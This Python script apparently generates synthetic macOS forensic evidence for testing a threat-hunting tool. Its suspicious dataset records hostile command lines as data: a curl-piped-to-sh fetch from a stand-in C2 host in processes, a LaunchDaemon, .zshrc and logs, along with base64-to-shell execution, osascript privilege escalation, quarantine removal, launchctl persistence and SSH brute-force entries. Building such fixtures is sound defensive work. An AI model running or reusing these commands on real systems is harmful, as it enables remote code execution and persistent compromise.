#!/usr/bin/env python3
"""Regenerate the fully synthetic evidence under examples/.

Everything here is fabricated: hostnames use .example.test, IP addresses come from the
RFC 5737 documentation ranges, and the "malware" hash is the SHA-256 of a harmless string.
Run from the repository (mac-threat-hunter/) directory:

    python scripts/generate_synthetic_evidence.py
"""

from __future__ import annotations

import json
import sys
from datetime import UTC, datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from mac_threat_hunter.baseline.model import canonical_hash, create_baseline  # noqa: E402
from mac_threat_hunter.config import load_config  # noqa: E402
from mac_threat_hunter.evidence.loader import load_evidence  # noqa: E402
from mac_threat_hunter.evidence.manifest import write_evidence  # noqa: E402
from mac_threat_hunter.models import CollectorResult  # noqa: E402

EVIL_SHA = "e35e17e932059ca07b1436091b5ca79569134f0e3ff10f83d9bc0a74a032accf"
HOSTS_CLEAN_SHA = "1" * 64
HOSTS_MODIFIED_SHA = "2" * 64
ZSHRC_CLEAN_SHA = "3" * 64
ZSHRC_MODIFIED_SHA = "4" * 64
COLLECTED = datetime(2026, 3, 10, 14, 30, tzinfo=UTC)
APPLE_SIGNED = {"status": "signed", "team_id": None, "identifier": "com.apple.synthetic"}


def system_record(suspicious: bool) -> dict:
    return {
        "hostname": "synthetic-mac.example.test",
        "os": {"product_name": "macOS", "version": "14.5", "build": "23F79"},
        "arch": "arm64",
        "boot_time": "2026-03-01T08:00:00.000000Z",
        "uptime_seconds": 9 * 86400 + 6 * 3600 + 30 * 60,
        "local_utc_offset": "+00:00",
        "sessions": [{"user": "alice", "tty": "console", "since": "Mar 1 08:05"}],
        "security": {
            "sip": "enabled",
            "gatekeeper": "disabled" if suspicious else "enabled",
            "filevault": "on",
            "firewall": "off" if suspicious else "on",
        },
        "interfaces": [{"name": "en0", "flags": ["UP", "RUNNING"], "addresses": ["192.168.1.20"]}],
        "routes": [{"destination": "default", "gateway": "192.168.1.1", "interface": "en0"}],
    }


def p(pid, ppid, user, name, path, start, cmdline=None, sha=None, sign=None):
    rec = {"pid": pid, "ppid": ppid, "user": user, "name": name, "path": path, "start_time": start}
    if cmdline:
        rec["cmdline"] = cmdline
    if sha:
        rec["sha256"] = sha
    if sign:
        rec["codesign"] = sign
    return rec


def processes(suspicious: bool) -> list[dict]:
    t0 = "2026-03-01T08:00:05.000000Z"
    out = [
        p(1, 0, "root", "launchd", "/sbin/launchd", t0, "/sbin/launchd", sign=APPLE_SIGNED),
        p(
            101,
            1,
            "root",
            "WindowServer",
            "/System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer",
            t0,
            sign=APPLE_SIGNED,
        ),
        p(
            350,
            1,
            "alice",
            "Finder",
            "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",
            "2026-03-01T08:06:00.000000Z",
            sign=APPLE_SIGNED,
        ),
        p(
            400,
            1,
            "alice",
            "Safari",
            "/Applications/Safari.app/Contents/MacOS/Safari",
            "2026-03-10T09:00:00.000000Z",
            sign=APPLE_SIGNED,
        ),
        p(
            410,
            1,
            "alice",
            "Terminal",
            "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
            "2026-03-10T09:30:00.000000Z",
            sign=APPLE_SIGNED,
        ),
        p(
            411,
            410,
            "alice",
            "zsh",
            "/bin/zsh",
            "2026-03-10T09:30:01.000000Z",
            "-zsh",
            sign=APPLE_SIGNED,
        ),
        p(
            412,
            411,
            "alice",
            "python3",
            "/opt/homebrew/bin/python3",
            "2026-03-10T09:40:00.000000Z",
            "python3 /Users/alice/dev/analysis.py",
            sign={"status": "adhoc", "team_id": None, "identifier": "python3"},
        ),
        p(
            420,
            1,
            "alice",
            "zoom.us",
            "/private/var/folders/ab/cd/T/AppTranslocation/9F1C2B3A-0000-4000-8000-000000000001/d/zoom.us.app/Contents/MacOS/zoom.us",
            "2026-03-10T10:00:00.000000Z",
            sign={"status": "signed", "team_id": "SYNTH12345", "identifier": "us.zoom.xos"},
        ),
    ]
    if suspicious:
        out += [
            p(
                500,
                1,
                "alice",
                "Microsoft Word",
                "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
                "2026-03-10T14:00:00.000000Z",
                sign={
                    "status": "signed",
                    "team_id": "UBF8T346G9",
                    "identifier": "com.microsoft.Word",
                },
            ),
            p(
                501,
                500,
                "alice",
                "sh",
                "/bin/sh",
                "2026-03-10T14:01:10.000000Z",
                "sh -c curl -s http://c2.malicious.example.test/stage.sh | sh",
                sign=APPLE_SIGNED,
            ),
            p(
                502,
                501,
                "alice",
                "curl",
                "/usr/bin/curl",
                "2026-03-10T14:01:11.000000Z",
                "curl -s http://c2.malicious.example.test/stage.sh",
                sign=APPLE_SIGNED,
            ),
            p(
                503,
                1,
                "alice",
                ".updater",
                "/private/tmp/.updater",
                "2026-03-10T14:01:20.000000Z",
                "/private/tmp/.updater --password=SyntheticSecret123",
                sha=EVIL_SHA,
                sign={"status": "unsigned", "team_id": None, "identifier": None},
            ),
            p(
                504,
                411,
                "alice",
                "python3",
                "/opt/homebrew/bin/python3",
                "2026-03-10T14:05:00.000000Z",
                "python3 /Users/Shared/run.py --token=abc123synthetic",
                sign={"status": "adhoc", "team_id": None, "identifier": "python3"},
            ),
            p(
                505,
                411,
                "alice",
                "osascript",
                "/usr/bin/osascript",
                "2026-03-10T14:06:00.000000Z",
                'osascript -e do shell script "id" with administrator privileges',
                sign=APPLE_SIGNED,
            ),
            p(
                506,
                411,
                "alice",
                "bash",
                "/bin/bash",
                "2026-03-10T14:07:00.000000Z",
                "bash -c echo ZWNobyBoaQ== | base64 -D | sh",
                sign=APPLE_SIGNED,
            ),
            p(
                507,
                411,
                "alice",
                "xattr",
                "/usr/bin/xattr",
                "2026-03-10T14:08:00.000000Z",
                "xattr -d com.apple.quarantine /Users/alice/Downloads/Installer.app",
                sign=APPLE_SIGNED,
            ),
            p(
                508,
                411,
                "alice",
                "launchctl",
                "/bin/launchctl",
                "2026-03-10T14:09:00.000000Z",
                "launchctl load /private/tmp/com.example.updater.plist",
                sign=APPLE_SIGNED,
            ),
        ]
    return out


def net(proto, state, laddr, lport, raddr, rport, pid, pname, user="alice", host=None):
    rec = {"proto": proto, "state": state, "local_address": laddr, "local_port": lport,
           "remote_address": raddr, "remote_port": rport, "pid": pid, "process_name": pname,
           "user": user, "process_association": "lsof"}  # fmt: skip
    if host:
        rec["remote_host"] = host
    return rec


def network(suspicious: bool) -> list[dict]:
    out = [
        net(
            "tcp",
            "ESTABLISHED",
            "192.168.1.20",
            49711,
            "203.0.113.10",
            443,
            400,
            "Safari",
            host="www.example.test",
        ),
        net("tcp", "LISTEN", "*", 49152, None, None, 1, "rapportd"),
        net("tcp", "LISTEN", "*", 7000, None, None, 1, "ControlCenter"),
        net("tcp", "LISTEN", "127.0.0.1", 631, None, None, 1, "cupsd", user="root"),
    ]
    if suspicious:
        out += [
            net("tcp", "ESTABLISHED", "192.168.1.20", 49822, "198.51.100.23", 443, 503, ".updater"),
            net(
                "tcp",
                "ESTABLISHED",
                "192.168.1.20",
                49830,
                "198.51.100.23",
                80,
                502,
                "curl",
                host="c2.malicious.example.test",
            ),
            net("tcp", "LISTEN", "0.0.0.0", 8000, None, None, 504, "python3"),
        ]
    return out


def plist(
    path,
    kind,
    label,
    program,
    args=None,
    *,
    owner="root",
    mode="0644",
    sha,
    exists=True,
    program_sha=None,
    sign=None,
    run=True,
    keep=False,
    mtime="2026-02-01T10:00:00.000000Z",
):
    scope = "user" if path.startswith("/Users/") else "system"
    rec = {"path": path, "kind": kind, "scope": scope, "label": label, "owner": owner, "group": "wheel" if owner == "root" else "staff",
           "mode": mode, "mtime": mtime, "sha256": sha, "program_path": program, "program_exists": exists,
           "run_at_load": run, "keep_alive": keep}  # fmt: skip
    if args:
        rec["program_arguments"] = args
    if program_sha:
        rec["program_sha256"] = program_sha
    if sign:
        rec["program_codesign"] = sign
    return rec


def persistence(suspicious: bool) -> list[dict]:
    vendor_sign = {
        "status": "signed",
        "team_id": "SYNTH12345",
        "identifier": "com.vendor.legit.helper",
    }
    out = [
        plist(
            "/Library/LaunchDaemons/com.vendor.legit.plist",
            "launch_daemon",
            "com.vendor.legit.helper",
            "/Library/PrivilegedHelperTools/com.vendor.legit.helper",
            sha="a" * 64,
            program_sha="b" * 64,
            sign=vendor_sign,
        ),
        plist(
            "/Library/LaunchAgents/com.microsoft.update.agent.plist",
            "launch_agent",
            "com.microsoft.update.agent",
            "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft Update Assistant",
            sha="c" * 64,
            program_sha="d" * 64,
            sign={
                "status": "signed",
                "team_id": "UBF8T346G9",
                "identifier": "com.microsoft.update",
            },
        ),
        {
            "path": "/Users/alice/.zshrc",
            "kind": "shell_startup",
            "scope": "user",
            "owner": "alice",
            "group": "staff",
            "mode": "0644",
            "mtime": "2026-03-10T14:03:00.000000Z" if suspicious else "2026-01-15T09:00:00.000000Z",
            "sha256": ZSHRC_MODIFIED_SHA if suspicious else ZSHRC_CLEAN_SHA,
            "lines_of_interest": ["curl -s http://c2.malicious.example.test/x.sh | sh"]
            if suspicious
            else [],
        },
    ]
    if suspicious:
        out += [
            plist(
                "/Users/alice/Library/LaunchAgents/com.example.updater.plist",
                "launch_agent",
                "com.example.updater",
                "/private/tmp/.updater",
                ["/private/tmp/.updater", "--background"],
                owner="alice",
                mode="0644",
                sha="e" * 64,
                program_sha=EVIL_SHA,
                keep=True,
                mtime="2026-03-10T14:01:00.000000Z",
                sign={"status": "unsigned", "team_id": None, "identifier": None},
            ),
            plist(
                "/Users/alice/Library/LaunchAgents/com.example.old.plist",
                "launch_agent",
                "com.example.old",
                "/Applications/Old.app/Contents/MacOS/old",
                owner="alice",
                sha="f" * 64,
                exists=False,
                mtime="2025-11-02T10:00:00.000000Z",
            ),
            plist(
                "/Library/LaunchDaemons/com.example.helper.plist",
                "launch_daemon",
                "com.example.helper",
                "/bin/sh",
                ["/bin/sh", "-c", "curl -s http://c2.malicious.example.test/stage.sh | sh"],
                mode="0666",
                sha="9" * 64,
                mtime="2026-03-10T14:02:00.000000Z",
            ),
        ]
    return out


def files(suspicious: bool) -> list[dict]:
    def cfg(path, mode, sha, owner="root", mtime="2025-10-01T08:00:00.000000Z"):
        return {"path": path, "kind": "config_file", "owner": owner, "group": "wheel", "mode": mode, "size": 1024,
                "mtime": mtime, "sha256": sha, "is_executable": False}  # fmt: skip

    out = [
        cfg("/etc/sudoers", "0440", "5" * 64),
        cfg(
            "/etc/hosts",
            "0644",
            HOSTS_MODIFIED_SHA if suspicious else HOSTS_CLEAN_SHA,
            mtime="2026-03-10T14:04:00.000000Z" if suspicious else "2025-10-01T08:00:00.000000Z",
        ),
        cfg("/etc/ssh/sshd_config", "0644", "6" * 64),
        {
            "path": "/Users/alice/Downloads/tool-installer",
            "kind": "watched_file",
            "owner": "alice",
            "group": "staff",
            "mode": "0755",
            "size": 52000,
            "mtime": "2026-01-29T12:00:00.000000Z",
            "sha256": "7" * 64,
            "is_executable": True,
            "has_exec_bit": True,
            "is_macho": True,
            "has_shebang": False,
        },
    ]
    if suspicious:
        out += [
            cfg("/etc/sudoers.d/90-lab", "0666", "8" * 64, mtime="2026-03-10T14:04:30.000000Z"),
            {
                "path": "/private/tmp/.updater",
                "kind": "watched_file",
                "owner": "alice",
                "group": "wheel",
                "mode": "0755",
                "size": 48213,
                "mtime": "2026-03-10T14:01:00.000000Z",
                "sha256": EVIL_SHA,
                "is_executable": True,
                "has_exec_bit": True,
                "is_macho": True,
                "has_shebang": False,
            },
            {
                "path": "/Users/Shared/payload.sh",
                "kind": "watched_file",
                "owner": "alice",
                "group": "staff",
                "mode": "0755",
                "size": 311,
                "mtime": "2026-03-07T10:00:00.000000Z",
                "sha256": "a1" * 32,
                "is_executable": True,
                "has_exec_bit": True,
                "is_macho": False,
                "has_shebang": True,
            },
        ]
    return out


def log_lines(suspicious: bool) -> str:
    def ev(ts, proc, msg, pid=700, image=None):
        return json.dumps({"timestamp": ts, "processImagePath": image or f"/usr/sbin/{proc}", "process": proc,
                           "processID": pid, "eventMessage": msg, "messageType": "Default",
                           "subsystem": "", "category": ""}, sort_keys=True)  # fmt: skip

    lines = [
        ev("2026-03-10 13:00:00.000000+0000", "sshd", "Server listening on 0.0.0.0 port 22."),
        ev(
            "2026-03-10 13:05:00.000000+0000",
            "sudo",
            "alice : TTY=ttys001 ; PWD=/Users/alice ; USER=root ; COMMAND=/usr/bin/whoami",
            image="/usr/bin/sudo",
        ),
    ]
    if not suspicious:
        return "\n".join(lines) + "\n"
    fail_times = ["14:10:00", "14:10:20", "14:10:50", "14:11:15", "14:11:40", "14:12:30"]
    users = ["admin", "root", "test", "oracle", "admin", "ubuntu"]
    for i, (t, u) in enumerate(zip(fail_times, users, strict=True)):
        lines.append(
            ev(
                f"2026-03-10 {t}.123456+0000",
                "sshd",
                f"Failed password for invalid user {u} from 192.0.2.50 port {51122 + i} ssh2",
                pid=800 + i,
            )
        )
    lines.append(
        ev(
            "2026-03-10 14:13:10.000000+0000",
            "sshd",
            "Accepted password for alice from 192.0.2.50 port 51200 ssh2",
            pid=810,
        )
    )
    for t in ("14:20:00", "14:20:30"):  # below the default threshold of 5: a false-positive control
        lines.append(
            ev(
                f"2026-03-10 {t}.000000+0000",
                "sshd",
                "Failed password for bob from 192.0.2.77 port 40000 ssh2",
                pid=820,
            )
        )
    for t in ("14:21:00", "14:21:20", "14:21:40"):
        lines.append(
            ev(
                f"2026-03-10 {t}.000000+0000",
                "sudo",
                "alice : 1 incorrect password attempt ; TTY=ttys001 ; PWD=/Users/alice ; USER=root ; COMMAND=/bin/bash",
                image="/usr/bin/sudo",
            )
        )
    lines.append(
        ev(
            "2026-03-10 14:01:10.500000+0000",
            "sh",
            "exec: curl -s http://c2.malicious.example.test/stage.sh | sh",
            pid=501,
            image="/bin/sh",
        )
    )
    lines.append("garbage-line-that-is-not-json (synthetic malformed record)")
    return "\n".join(lines) + "\n"


def build(out_dir: Path, suspicious: bool) -> dict:
    cfg = load_config()
    results = []
    for name, records in (
        ("system", [system_record(suspicious)]),
        ("processes", processes(suspicious)),
        ("network", network(suspicious)),
        ("persistence", persistence(suspicious)),
        ("files", files(suspicious)),
    ):
        results.append(CollectorResult(name=name, status="ok", records=records))
    logs = CollectorResult(
        name="logs", status="ok", raw_files={"unified_log.ndjson": log_lines(suspicious)}
    )
    logs.records = [{} for _ in log_lines(suspicious).splitlines()]
    results.append(logs)
    manifest = write_evidence(
        out_dir, results, profile="full", host={"hostname": "synthetic-mac.example.test",
        "os": {"product_name": "macOS", "version": "14.5", "build": "23F79"}, "arch": "arm64"},
        started=COLLECTED.replace(minute=29), finished=COLLECTED, timezone_offset="+00:00", is_root=False,
        synthetic=True,
        extra={"notes": ["SYNTHETIC EVIDENCE: fabricated for demonstration; contains no real host data."]},
    )  # fmt: skip
    _ = cfg
    return manifest


def main() -> None:
    build(ROOT / "examples" / "synthetic-evidence", suspicious=True)
    build(ROOT / "examples" / "synthetic-evidence-clean", suspicious=False)
    cfg = load_config()
    ev = load_evidence(ROOT / "examples" / "synthetic-evidence-clean", cfg)
    baseline = create_baseline(ev)
    baseline.created_at = "2026-03-01T09:00:00.000000Z"
    baseline.integrity = canonical_hash(baseline.observations)
    path = ROOT / "examples" / "baselines" / "clean-baseline.json"
    path.write_text(
        json.dumps(baseline.to_dict(), indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    print("wrote synthetic evidence, clean evidence and examples/baselines/clean-baseline.json")


if __name__ == "__main__":
    main()
